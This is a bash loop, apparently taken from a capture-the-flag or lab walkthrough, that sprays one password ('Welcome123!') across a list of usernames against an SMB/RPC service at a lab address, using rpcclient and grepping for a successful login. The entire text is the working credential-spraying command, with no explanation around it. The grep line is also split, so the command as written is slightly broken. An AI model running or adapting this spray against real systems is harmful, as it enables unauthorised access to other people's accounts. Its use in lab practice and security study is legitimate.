for u in $(cat users | awk -F@ '{print $1}' | awk -F: '{print $2}');
do
rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.10.10.169 | grep
Authority;
done
